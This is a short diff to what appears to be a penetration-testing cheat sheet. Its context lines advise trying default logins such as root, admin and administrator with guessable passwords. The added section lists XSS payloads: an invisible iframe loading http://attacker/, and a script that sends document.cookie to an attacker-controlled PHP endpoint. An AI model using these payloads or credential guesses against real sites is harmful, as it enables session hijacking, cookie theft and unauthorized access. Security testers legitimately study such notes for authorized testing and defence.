@@ -118,3 +118,9 @@ Login
     Always try user root, admin, administrator with password letmein admin root
 Files
     Run strings against every file
+
+XSS vectors
+	Invisible iframe:
+	*<iframe src="http://attacker/" height="0" width="0"></iframe>*
+	Steal cookies
+	*<script> new Image().src="http://attacker/bogus.php?output="+document.cookie; </script>*
